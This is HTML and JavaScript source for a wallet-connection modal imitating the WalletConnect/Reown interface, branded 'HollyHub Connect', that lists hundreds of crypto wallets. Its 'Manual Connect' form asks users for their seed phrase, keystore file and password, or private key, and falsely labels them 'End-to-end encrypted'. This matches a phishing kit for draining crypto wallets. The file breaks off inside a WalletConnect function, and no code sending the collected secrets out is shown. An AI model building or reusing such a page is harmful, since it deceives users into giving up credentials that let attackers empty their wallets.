<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect – Reown Style</title>
        <!-- WalletConnect will be provided by the bundled app (Vite) -->
        <!-- Optional: Ethereum Provider if you want it later -->
        <!-- (Do NOT add manual <script> tags for WalletConnect or main.* in index.html) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --reown-bg: #0a0a0c;
            --reown-card: rgba(23, 23, 26, 0.85);
            --reown-border: rgba(255, 255, 255, 0.08);
            --reown-text: #e5e5e5;
            --reown-accent: #3396ff;
        }
        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0a0c 0%, #111113 50%, #1a1a20 100%);
            color: var(--reown-text);
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        html, body {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        html::-webkit-scrollbar, body::-webkit-scrollbar {
            width: 0;
            height: 0;
        }
        .modal-overlay, .manual-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        .modal-overlay.active, .manual-overlay.active {
            display: flex;
            opacity: 1;
        }
        .modal-content, .manual-content {
            background: var(--reown-card);
            border-radius: 32px;
            border: 1px solid var(--reown-border);
            box-shadow: 0 25px 60px -12px rgba(0,0,0,0.7);
            width: 100%;
            max-width: 440px;
            max-height: 92vh;
            overflow-y: auto;
            -ms-overflow-style: none;
            scrollbar-width: none;
            position: relative;
            backdrop-filter: blur(20px);
            transform: scale(0.95);
            transition: transform 0.4s ease;
        }
        .modal-content::-webkit-scrollbar,
        .manual-content::-webkit-scrollbar {
            width: 0;
            height: 0;
        }
        .modal-overlay.active .modal-content, .manual-overlay.active .manual-content {
            transform: scale(1);
        }
        .sticky-header {
            position: sticky;
            top: 0;
            background: rgba(23, 23, 26, 0.9);
            backdrop-filter: blur(16px);
            z-index: 10;
            border-bottom: 1px solid var(--reown-border);
        }
        .close-btn {
            position: absolute;
            right: 14px;
            top: 14px;
            width: 36px;
            height: 36px;
            border-radius: 10px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            color: #ddd;
            font-size: 18px;
            cursor: pointer;
        }
        .close-btn:hover { background: rgba(255,255,255,0.08); }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            padding: 0 12px 24px;
        }
        .wallet-item {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 16px 8px;
            text-align: center;
            transition: all 0.25s ease;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            aspect-ratio: 1 / 1.05;
        }
        .wallet-item:hover {
            background: rgba(51, 150, 255, 0.08);
            border-color: rgba(51, 150, 255, 0.3);
            transform: translateY(-2px);
        }
        .wallet-icon-wrapper {
            position: relative;
            width: 56px;
            height: 56px;
            margin-bottom: 10px;
        }
        .sticky-footer {
            position: sticky;
            bottom: 0;
            background: transparent;
            padding: 16px 24px;
            z-index: 10;
            border-top: 1px solid var(--reown-border);
            backdrop-filter: blur(12px);
        }
        .social-logins {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 12px;
            pointer-events: auto;
        }
        .social-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255,255,255,0.08);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            cursor: pointer;
        }
        .social-icon:hover {
            background: rgba(51,150,255,0.25);
            transform: scale(1.1);
        }
        .social-icon img {
            width: 22px;
            height: 22px;
        }
        .status-text {
            text-align: center;
            font-size: 0.875rem;
            color: #a1a1aa;
            pointer-events: none;
        }
        .status-failed {
            color: #ef4444 !important;
        }
        .more-btn {
            background: rgba(51, 150, 255, 0.1);
            border: 1px solid rgba(51, 150, 255, 0.3);
            color: #3396ff;
        }
        .more-btn:hover {
            background: rgba(51, 150, 255, 0.2);
        }
        .tab-buttons {
            display: flex;
            gap: 8px;
            margin-bottom: 24px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 10px 20px;
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.875rem;
        }
        .tab-btn.active {
            background: var(--reown-accent);
            color: white;
        }
        .word-grid {
            display: grid;
            gap: 12px;
            margin-bottom: 16px;
        }
        .word-input {
            width: 100%;
            padding: 12px;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            color: white;
            text-align: center;
            transition: color 0.2s ease, border-color 0.2s ease;
        }
        .word-input.correct {
            color: #10b981 !important;
            border-color: #10b981 !important;
        }
        .word-input.incorrect {
            color: #ef4444 !important;
            border-color: #ef4444 !important;
        }
        .encrypted-text {
            color: #10b981;
            font-size: 0.75rem;
            text-align: center;
            margin-top: 16px;
        }
        .connect-btn {
            margin-top: 24px;
            width: 100%;
            padding: 14px;
            background: var(--reown-accent);
            color: white;
            border-radius: 12px;
            font-weight: 600;
        }
        .input-field {
            width: 100%;
            padding: 16px;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 16px;
            color: white;
            font-family: monospace;
            resize: vertical;
            min-height: 120px;
        }
        .login-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(8px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        .login-box {
            background: var(--reown-card);
            border-radius: 24px;
            border: 1px solid var(--reown-border);
            padding: 32px;
            width: 90%;
            max-width: 380px;
            text-align: center;
        }
        .login-box h3 {
            margin-bottom: 20px;
            font-size: 1.5rem;
        }
        .login-input {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            color: white;
        }
        .login-btn {
            margin-top: 16px;
            width: 100%;
            padding: 12px;
            background: var(--reown-accent);
            color: white;
            border-radius: 12px;
            font-weight: 600;
        }
        .modal-content .status-text { display: none !important; }
        .connect-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 340px;
            height: 200px;
            background: #ffffff;
            color: #111111;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 24px;
            z-index: 10001;
            overflow: hidden;
            opacity: 0;
            transform: translateX(20px);
            transition: opacity 0.3s ease, transform 0.3s ease;
            pointer-events: none;
        }
        .connect-overlay.active { opacity: 1; transform: translateX(0); pointer-events: auto; }
        .main-wallet-wrap {
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            margin-bottom: 18px;
            background: transparent;
            box-shadow: 0 6px 18px rgba(0,0,0,0.12);
            border-radius: 12px;
        }
        #modalMainWalletImg {
            width: 96px;
            height: 96px;
            border-radius: 12px;
            object-fit: contain;
            z-index: 1;
            background: #fff;
        }
        .connect-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 110px;
            height: 110px;
            pointer-events: none;
            opacity: 0;
            transition: opacity 160ms ease;
            z-index: 2;
        }
        .connect-ring.active { opacity: 1; }
        .connect-ring svg { width: 110px; height: 110px; display: block; }
        .connect-ring rect.track { stroke: rgba(0,0,0,0.06); stroke-width: 8; fill: none; }
        .connect-ring rect.progress {
            stroke: #F57251;
            stroke-width: 6;
            stroke-linecap: round;
            fill: none;
            stroke-dasharray: 50 356;
            stroke-dashoffset: 356;
            animation: squareProgress 1.8s linear infinite;
        }
        @keyframes squareProgress {
            from { stroke-dashoffset: 376; }
            to { stroke-dashoffset: 15; }
        }
        .connect-overlay .overlay-message { margin-top: 10px; font-weight: 600; opacity: 0; transition: opacity 0.25s ease; }
        .connect-overlay .overlay-message.failed { color: #ef4444; opacity: 1; }
    </style>
</head>
<body>
    <button id="open-modal" class="px-10 py-4 bg-gradient-to-r from-indigo-600 to-purple-600 rounded-2xl font-semibold text-lg shadow-2xl hover:brightness-110 transition">
        Launch HollyHub Connect
    </button>

    <!-- Main Wallet Connect Modal -->
    <div id="modal-overlay" class="modal-overlay">
        <div class="modal-content">
            <div class="sticky-header px-8 pt-8 pb-4" style="position:relative;">
                <h2 class="text-2xl font-semibold text-center mb-1">Connect Wallet</h2>
                <p class="text-center text-sm text-gray-400">Choose your preferred wallet</p>
                <button id="close-modal-btn" class="close-btn" aria-label="Close">✕</button>
            </div>
            <div class="px-8 pt-6 pb-4">
                <input id="wallet-search" type="text" placeholder="Search wallets..." class="w-full px-5 py-3 bg-black/30 border border-white/10 rounded-2xl text-white placeholder-gray-500 focus:outline-none focus:border-[var(--reown-accent)]/50 transition text-sm"/>
            </div>
            <div id="visible-wallets" class="wallet-grid px-6"></div>
            <div class="flex justify-center mt-6 mb-4">
                <button id="toggle-more" class="more-wallets-btn more-btn px-10 py-3 rounded-2xl text-sm font-medium transition">
                    More wallets (396)
                </button>
            </div>
            <div id="extra-wallets" class="wallet-grid px-6 pb-12 hidden"></div>
            <div class="sticky-footer">
                <div class="social-logins">
                    <div class="social-icon" data-provider="google" title="Sign in with Google">
                        <img src="https://www.google.com/favicon.ico" alt="Google">
                    </div>
                    <div class="social-icon" data-provider="facebook" title="Sign in with Facebook">
                        <img src="/wallets/facebook.png" alt="Facebook">
                    </div>
                    <div class="social-icon" data-provider="apple" title="Sign in with Apple">
                        <img src="/wallets/apple.png" alt="Apple" style="width:32px;height:32px;">
                    </div>
                    <div class="social-icon" data-provider="github" title="Sign in with GitHub">
                        <img src="https://github.com/favicon.ico" alt="GitHub">
                    </div>
                </div>
                <div id="status-message" class="status-text">
                    Select a wallet to connect
                </div>
            </div>
        </div>
    </div>

    <!-- App Detector Popup -->
    <div id="app-detector-overlay" class="login-overlay" style="display:none;">
        <div class="login-box" id="app-detector-box">
            <h3 id="detector-title">Open wallet app</h3>
            <div id="detected-list" style="display:flex;flex-direction:column;gap:8px;margin-top:12px;"></div>
            <div style="margin-top:12px;display:flex;gap:10px;justify-content:center;">
                <button id="detector-cancel" class="mt-4 text-gray-400 hover:text-white text-sm">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Right-side connect overlay -->
    <div id="connect-overlay" class="connect-overlay" aria-hidden="true">
        <div class="main-wallet-wrap">
            <img id="modalMainWalletImg" src="" alt="Selected Wallet">
            <div id="connectRing" class="connect-ring" aria-hidden="true">
                <svg viewBox="0 0 100 100">
                    <rect class="track" x="8" y="8" width="84" height="84" rx="16"></rect>
                    <rect class="progress" x="8" y="8" width="84" height="84" rx="16"></rect>
                </svg>
            </div>
        </div>
        <div id="overlay-wallet-name" class="text-sm font-semibold text-center"></div>
        <div id="overlay-message" class="overlay-message"></div>
    </div>

    <!-- Manual Connect Modal -->
    <div id="manual-overlay" class="manual-overlay">
        <div class="manual-content">
            <div class="sticky-header px-8 pt-8 pb-4">
                <h2 class="text-2xl font-semibold text-center mb-1">Manual Connect</h2>
                <p class="text-center text-sm text-gray-400">Enter your wallet details securely</p>
                <button id="close-manual-btn" class="close-btn" aria-label="Close">✕</button>
            </div>
            <div class="px-8 py-6">
                <div class="tab-buttons">
                    <div class="tab-btn active" data-tab="phrase">Phrase</div>
                    <div class="tab-btn" data-tab="keystore">Keystone JSON</div>
                    <div class="tab-btn" data-tab="private">Private Key</div>
                </div>
                <div id="phrase-tab" class="tab-content">
                    <div class="flex justify-center gap-8 mb-6">
                        <label class="flex items-center gap-2">
                            <input type="radio" name="phrase-length" value="12" checked class="accent-[var(--reown-accent)]">
                            <span>12 words</span>
                        </label>
                        <label class="flex items-center gap-2">
                            <input type="radio" name="phrase-length" value="24" class="accent-[var(--reown-accent)]">
                            <span>24 words</span>
                        </label>
                    </div>
                    <div id="phrase-grid" class="word-grid"></div>
                </div>
                <div id="keystore-tab" class="tab-content hidden">
                    <textarea id="keystore-json" class="input-field" placeholder='Paste your Keystore JSON here...'></textarea>
                    <input type="password" id="keystore-password" class="input-field mt-4" placeholder="Keystore Password">
                </div>
                <div id="private-tab" class="tab-content hidden">
                    <input type="text" id="private-key" class="input-field" placeholder="Enter your Private Key">
                </div>
                <p class="encrypted-text">End-to-end encrypted</p>
                <button class="connect-btn">Connect wallet</button>
            </div>
        </div>
    </div>

    <script type="module" src="/src/main.js"></script>
    <script type="module">
        // Entry code runs here; Vite will inject the bundled `src/main.js` during dev/build.
        // ────────────────────────────────────────────────────────────────────────────────
        // Your original variables and functions (unchanged)
        // ────────────────────────────────────────────────────────────────────────────────
        const modalOverlay = document.getElementById('modal-overlay');
        const manualOverlay = document.getElementById('manual-overlay');
        const openBtn = document.getElementById('open-modal');
        const toggleMoreBtn = document.getElementById('toggle-more');
        const extraWallets = document.getElementById('extra-wallets');
        const statusMessage = document.getElementById('status-message');
        const searchInput = document.getElementById('wallet-search');
        const visibleWallets = document.getElementById('visible-wallets');
        let isExpanded = false;

        const visibleList = [
            { name: 'MetaMask', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
            { name: 'WalletConnect', icon: 'https://avatars.githubusercontent.com/u/37784886?s=200&v=4' },
            { name: 'Phantom', icon: '/wallets/phantom.png' }
        ];

        // Use the canonical wallet list provided by the user (deduped)
        const rawExtraWallets = [
            'metamask','walletconnect','phantom','trustwallet','coinbasewallet','ledgerlive','okxwallet','bitgetwallet',
            'tokenpocket','safepal','uniswapwallet','zerion','xportal','cryptocomdefiwallet','bitcoincomwallet','bifrostwallet',
            'bybitwallet','roninwallet','imtoken','safe(gnosis)','geminwallet','ctrlwallet','arculuswallet','wemixplaywallet',
            'tangemwallet','exodus','hashpack','pintuwallet','blackfortwallet','wigwam','subwallet','avacus','keplr','petrawallet',
            'templewallet','ambirewallet','basewallet','alchemysmartwallet','openfort','zengo','rabbywallet','krakenwallet',
            'readywallet','backpack','portalwallet','litprotocolwallet','castlewallet','trezorsuite','dfnswallet','tahowallet',
            'candidwallet','solflare','unipass','soulwallet','cashmerewallet','mew(myetherwallet)','stackupwallet','sequencewallet',
            'blockwallet','enkrypt','obviouswallet','alphawallet','multis','coin98','alfa1wallet','venlywallet','frontierwallet',
            'dapppocket','dcentwallet','ellipalwallet','sepiorwallet','qredowallet','snowflakewallet','gowallet','1inchwallet',
            'binanceweb3wallet','bitpaywallet','bestwallet','fireblockswallet','nexowallet','coinrabbitwallet','youhodlerwallet',
            'trusteewallet','guardawallet','infinitowallet','ownrwallet','coinwallet','electrumwallet','simpleholdwallet','jubiterblade',
            'komodowallet','myceliumwallet','gemwallet','zeplywallet','zumowallet','myetherwallet','cryptxwallet','xapowallet',
            'coinpaymentswallet','nowwallet','spectrocoinwallet','breadwallet','flxwallet','atomexwallet','heliowallet','jaxxlibertywallet',
            'keepkeywallet','unstoppablewallet','secuxwallet','etherwall','samouraiwallet','etherliwallet','enjinwallet','indiesquare',
            'litevault','holytransaction','mycrypto','edgewallet','daedaluswallet','omniwallet','ankerspay','binanceappwallet','bitamp',
            'bitpie','blockchaincomwallet','brdwallet','btccomwallet','cashapp','chivowallet','circleinvest','citowise','coinsphwallet',
            'croptywallet','digifoxwallet','greenaddress','havenwallet','kleverwallet','monarchwallet','omisegowallet','operawallet',
            'passkeyswallet','plarkwallet','prodogewallet','stakedwallet','statuswallet','swirlwallet','uport','xdefiwallet','yoroiwallet',
            'cryptocrit','bitgowallet','cryptomuswallet','coinomi','cwallet','plasbitwallet','cobowallet','binancechainwallet','jaxxwallet',
            'mathwallet','blockstreamgreen','armorywallet','infinitywallet','argentwallet','bixinwallet','quppywallet','freewallet','lumiwallet',
            'atomicwallet','udunwallet','balletwallet','monerogui','lisknano','mymonerowallet','neonwallet','vergewallet','owallet','incognitowallet',
            'mistwallet','medoozawallet','bonpay','wagecanwallet','zebpay','electrumstratis','bitcoincashfreewallet','electrumcash','fantomcoinfreewallet',
            'msignawallet','coinjarwallet','copaybitcoinwallet','bitxwallet','tokenlypockets','gatehub','zcashswinggui','zcashcockpitui','vcashclient',
            'carbonwallet','vslicewebwallet','litecoincoreclient','dogeChain','dogecoincore','monerocoreclient','bitwala','bitherwallet','dashfreewallet',
            'dogefreewallet','liskfreewallet','steemfreewallet','nxtfreewallet','ardorfreewallet','ethereumwallet','coinbank','airbitzbitcoinwallet','arcbit',
            'bitcoincoreclient','hw1ledgerwallet','bitaddresspaperwallet','schildbachbtcwallet','electrumltcwallet','darkwalletbtc','multidogewallet','dogeandroidwallet',
            'blockiowallet','coinapultwallet','btcwallet','coinspace','cryptonator','coolwallet','bitloxwallet','uberpaywallet','coincorner','bitcoinfreewallet',
            'monerofreewallet','coinvault','xethetherwallet','virtacoinwallet','singulardtvlightwallet','counterwallet','openledger','unocoin','bitpanda','daricowallet',
            'zcashfreewallet','bitinka','wavesliteclient','nxtclient','ipayyou','coinspot','mobi','agama','blockchainsmy','nemmobilewallet','nemnanowallet',
            'bitconnectclient','stellardesktop','parity','digibytecore','eidoo','lykkewallet','zumminer','gefarapay','freewalletcryptowallet','bitbuckswallet','gnoissafemultisig',
            'pillar','onto','bitpay','walleth','authereum','dharma','huobiwallet','mykey','loopringwallet','trustvault','alice','zelcore','nash','gridplus',
            'cybavowallet','tokenary','torus','spatium','walletio','ownbit','easypocket','bridgewallet','sparkpoint','viawallet','bitkeep','vision','peakdefiwallet',
            'halodefiwallet','dokwallet','atwallet','midaswallet','keyringpro','aktionariat','talkenwallet','xinfincxdcnetwork','flarewallet','kyberswap','atokenwallet',
            'tonguewallet','rwallet','plasmapay','o3wallet','hashkeyme','jadewallet','defiant','coius','cmorq','valora','quiverx','celowallet','elastosessentials',
            'fusecash','stasis','julwallet','fxwallet','bullapp','anybit','minervawallet','archipage','chaingefinance','iopay','coinhub','gopocket','wallet3','yitoken',
            'didwallet','starbase','shinobiwallet','steakwallet','gdwallet','binana','airgap','paytube','blockbank','orange','neftipedia','krystal','linen','celoterminal','spot',
            'rainbow','slushwallet','tronlink'
        ];

        const extraWalletNames = Array.from(new Set(rawExtraWallets));

        let walletManifest = {};
        (async function loadManifest() {
            try {
                const res = await fetch('/wallets/manifest.json');
                if (res.ok) {
                    walletManifest = await res.json();
                    // re-render wallets now that manifest icons are available
                    if (typeof renderVisibleWallets === 'function') renderVisibleWallets();
                    if (typeof populateExtraWallets === 'function') populateExtraWallets();
                }
            } catch (e) {
                walletManifest = {};
            }
        })();

        // Basic helper implementations so the modal displays wallets and close buttons work
        function normalizeKey(s) {
            return (s || '').toString().toLowerCase().replace(/[^a-z0-9]/g, '');
        }

        function getIconFromManifestByName(name) {
            if (!walletManifest || Object.keys(walletManifest).length === 0) return null;
            const map = {};
            Object.keys(walletManifest).forEach(k => { map[normalizeKey(k)] = walletManifest[k]; });
            const raw = normalizeKey(name.replace(/\(.*\)/, ''));
            const suffixes = ['wallet','wallets','app','suite','live','connect','web3','defi','client'];
            const candidates = [raw];
            suffixes.forEach(s => candidates.push(raw.replace(new RegExp(s + '$'), '')));
            // token variations
            raw.split(/[^a-z0-9]+/).forEach(tok => { if (tok) candidates.push(tok); });
            // try direct and reverse substring matches
            for (const c of candidates) {
                const key = normalizeKey(c);
                if (map[key]) return '/wallets/' + map[key];
            }
            // try substrings against manifest keys
            for (const k of Object.keys(map)) {
                if (raw.includes(k) || k.includes(raw)) return '/wallets/' + map[k];
            }
            return null;
        }

        function resolveIconUrl(name, providedIcon) {
            if (providedIcon) return providedIcon;
            const fromManifest = getIconFromManifestByName(name);
            if (fromManifest) return fromManifest;
            // Fallback placeholder with first letter
            const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
            return `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
        }

        // Mapping of known wallet keys to common mobile app URL schemes
        const walletSchemeLookup = {
            metamask: ['metamask://'],
            phantom: ['phantom://'],
            trustwallet: ['trust://','trustwallet://'],
            coinbasewallet: ['coinbase://','cbwallet://','coinbasewallet://'],
            ledgerlive: ['ledgerlive://'],
            okxwallet: ['okxwallet://','okx://'],
            bitgetwallet: ['bitget://','bitgetwallet://'],
            tokenpocket: ['tpwallet://','tokenpocket://','tokenpocketwallet://'],
            safepal: ['safepal://','safepalwallet://'],
            solflare: ['solflare://'],
            trezorsuite: ['trezor://','trezorsuite://'],
            rabbywallet: ['rabby://'],
            rainbow: ['rainbow://','rainbowwallet://'],
            coinomi: ['coinomi://'],
            coin98: ['coin98://'],
            bitkeep: ['bitkeep://'],
            walletconnect: ['wc://','walletconnect://']
        };

        function createWalletCard(entry) {
            const name = typeof entry === 'string' ? entry : (entry.name || 'Unknown');
            const icon = typeof entry === 'string' ? '' : (entry.icon || '');
            const card = document.createElement('div');
            card.className = 'wallet-item';
            card.dataset.wallet = name;
            // store icon or resolved icon path for later use
            if (icon) card.dataset.icon = icon;

            const wrapper = document.createElement('div');
            wrapper.className = 'wallet-icon-wrapper';
            const img = document.createElement('img');
            img.alt = name;
            img.style.width = '56px';
            img.style.height = '56px';
            // set source and handle loading errors (fallback to placeholder)
            const src = resolveIconUrl(name, icon);
            img.src = src;
            // store the resolved icon path for debugging and potential re-use
            card.dataset.icon = src;
            img.onerror = function() {
                const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
                this.onerror = null;
                this.src = `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
            };
            wrapper.appendChild(img);

            const label = document.createElement('div');
            label.style.fontSize = '0.9rem';
            label.style.marginTop = '6px';
            label.textContent = name;

            card.appendChild(wrapper);
            card.appendChild(label);
            card.addEventListener('click', handleWalletClick);
            return card;
        }

        function renderVisibleWallets() {
            if (!visibleWallets) return;
            visibleWallets.innerHTML = '';
            visibleList.forEach(w => visibleWallets.appendChild(createWalletCard(w)));
        }

        function populateExtraWallets() {
            if (!extraWallets) return;
            extraWallets.innerHTML = '';
            const fallbackList = ['Coinbase Wallet', 'Trust Wallet', 'Rainbow', 'Argent', 'Ledger Live', 'Trezor Suite'];
            const list = (extraWalletNames && extraWalletNames.length) ? extraWalletNames : fallbackList;
            list.forEach(w => extraWallets.appendChild(createWalletCard(w)));
        }

        // Detect candidate native wallet apps and browser extensions for common wallets.
        // For desktop browsers we check for injected providers (extensions) and return connectors.
        // For mobile / unknown we return URL schemes to try opening native apps.
        function detectInstalledWallets(name) {
            const key = normalizeKey(name);
            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
            const results = [];

            function pushIfUnique(arr, obj) {
                if (!arr.some(x => normalizeKey(x.name) === normalizeKey(obj.name))) arr.push(obj);
            }

            // Detect injected providers (desktop extensions)
            try {
                if (window.ethereum) {
                    const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
                    providers.forEach(p => {
                        try {
                            if (p.isMetaMask) pushIfUnique(results, { name: 'MetaMask', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'metamask://' });
                            else if (p.isCoinbaseWallet) pushIfUnique(results, { name: 'Coinbase Wallet', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'coinbase://' });
                            else pushIfUnique(results, { name: 'Ethereum Provider', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }) });
                        } catch (e) {}
                    });
                }
            } catch (e) {}

            try { if (window.solana && window.solana.isPhantom) pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => window.solana.connect(), scheme: 'phantom://' }); } catch (e) {}
            try { if (window.solflare && typeof window.solflare.connect === 'function') pushIfUnique(results, { name: 'Solflare', type: 'extension', connector: async () => window.solflare.connect(), scheme: 'solflare://' }); } catch (e) {}
            try { if (window.keplr) pushIfUnique(results, { name: 'Keplr', type: 'extension', connector: async () => { await window.keplr.enable && await window.keplr.enable(); return true; }, scheme: 'keplr://' }); } catch (e) {}
            try { if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { if (window.tronLink && window.tronLink.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb && window.tronWeb.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('No Tron request available'); }, scheme: 'tronlink://' }); } catch (e) {}
            try { if (window.safepal || window.SafePal) pushIfUnique(results, { name: 'SafePal', type: 'extension', connector: async () => { if (window.safepal && window.safepal.request) return await window.safepal.request({ method: 'eth_requestAccounts' }); throw new Error('SafePal connector not available'); }, scheme: 'safepal://' }); } catch (e) {}

            // Additional known wallet globals — best-effort detection for other extensions
            const knownWalletGlobals = [
                { name: 'Rabby', props: ['rabby', 'Rabby'], scheme: 'rabby://' },
                { name: 'Rainbow', props: ['rainbow', 'Rainbow'], scheme: 'rainbow://' },
                { name: 'MathWallet', props: ['mathwallet', 'MathWallet', 'mathWallet'], scheme: 'mathwallet://' },
                { name: 'TokenPocket', props: ['tp', 'TokenPocket', 'tokenPocket', 'tpwallet'], scheme: 'tpwallet://' },
                { name: 'Coin98', props: ['coin98', 'Coin98'], scheme: 'coin98://' },
                { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], scheme: 'bitkeep://' },
                { name: 'Wallet3', props: ['wallet3'], scheme: 'wallet3://' },
                { name: 'Opera', props: ['opera', 'operaWallet'], scheme: 'opera://' },
                { name: 'Trezor', props: ['trezor'], scheme: 'trezor://' }
            ];
            knownWalletGlobals.forEach(w => {
                for (const p of w.props) {
                    try {
                        const provider = window[p];
                        if (provider) {
                            pushIfUnique(results, {
                                name: w.name,
                                type: 'extension',
                                connector: async () => {
                                    if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' });
                                    if (typeof provider.connect === 'function') return await provider.connect();
                                    if (typeof provider.enable === 'function') return await provider.enable();
                                    throw new Error('No connect method on provider');
                                },
                                scheme: w.scheme
                            });
                            break;
                        }
                    } catch (e) {}
                }
            });

            // Desktop: if we have extensions, return matches prioritized to the requested wallet name
            if (!isMobile && results.length > 0) {
                const exactMatches = results.filter(r => normalizeKey(r.name) === key || key.includes(normalizeKey(r.name)) || normalizeKey(r.name).includes(key));
                if (exactMatches.length > 0) return exactMatches;
                return results;
            }

            // Mobile / fallback: return URL schemes (or guessed scheme)
            if (walletSchemeLookup[key]) {
                return walletSchemeLookup[key].map(s => ({ name: name, scheme: s }));
            }

            const apps = [];
            const base = normalizeKey(name).replace(/[^a-z0-9]/g, '');
            if (base) apps.push({ name: name, scheme: `${base}://` });
            return apps;
        }

        // Very small tryOpenDeepLink helper — attempts to open a URL and immediately run success callback.
        function tryOpenDeepLink(url, onFail, onSuccess) {
            try {
                const a = document.createElement('a');
                a.href = url;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                if (onSuccess) {
                    // Call success shortly after attempting the link — approval() will wait for wallet response
                    setTimeout(onSuccess, 100);
                }
            } catch (e) {
                if (onFail) onFail(e);
            }
        }

        // Wire up modal controls and search
        (function wireModalControls() {
            const closeBtn = document.getElementById('close-modal-btn');
            if (closeBtn) closeBtn.addEventListener('click', () => {
                modalOverlay.classList.remove('active');
                setTimeout(() => { modalOverlay.style.display = 'none'; }, 400);
            });

            const closeManualBtn = document.getElementById('close-manual-btn');
            if (closeManualBtn) closeManualBtn.addEventListener('click', () => {
                manualOverlay.classList.remove('active');
                setTimeout(() => { manualOverlay.style.display = 'none'; }, 400);
            });

            if (toggleMoreBtn) toggleMoreBtn.addEventListener('click', () => {
                isExpanded = !isExpanded;
                if (isExpanded) {
                    extraWallets.classList.remove('hidden');
                    toggleMoreBtn.textContent = 'Show fewer wallets';
                } else {
                    extraWallets.classList.add('hidden');
                    toggleMoreBtn.textContent = 'More wallets (396)';
                }
            });

            if (searchInput) searchInput.addEventListener('input', () => {
                const q = searchInput.value.trim().toLowerCase();
                const items = Array.from(document.querySelectorAll('.wallet-item'));
                if (!q) {
                    items.forEach(it => { it.style.display = ''; it.classList.remove('selected'); });
                    statusMessage.textContent = 'Select a wallet to connect';
                    statusMessage.classList.remove('status-failed');
                    return;
                }

                const matches = items.filter(it => (it.dataset.wallet || '').toLowerCase().includes(q));

                items.forEach(it => { it.style.display = matches.includes(it) ? '' : 'none'; it.classList.remove('selected'); });

                if (matches.length === 0) {
                    statusMessage.textContent = 'No wallets found';
                    statusMessage.classList.add('status-failed');
                } else {
                    statusMessage.textContent = `${matches.length} wallet${matches.length>1? 's' : ''} found`;
                    statusMessage.classList.remove('status-failed');
                    // If match in extra wallets, expand the extra list so the result is visible
                    const anyInExtra = matches.some(m => extraWallets && extraWallets.contains(m));
                    if (anyInExtra && extraWallets) {
                        extraWallets.classList.remove('hidden');
                        isExpanded = true;
                        if (toggleMoreBtn) toggleMoreBtn.textContent = 'Show fewer wallets';
                    }
                    // If exactly one match, highlight and scroll into view
                    if (matches.length === 1) {
                        const only = matches[0];
                        only.classList.add('selected');
                        setTimeout(() => only.scrollIntoView({ behavior: 'smooth', block: 'center' }), 100);
                    }
                }
            });

            // Render initially
            renderVisibleWallets();
            populateExtraWallets();
        })();

        // ────────────────────────────────────────────────────────────────────────────────
        // Updated WalletConnect v2 Integration (with your Project ID)
        // ────────────────────────────────────────────────────────────────────────────────
        async function initiateWalletConnectDeepLink(options = {}) {
            const { onFail, onSuccess } = options;

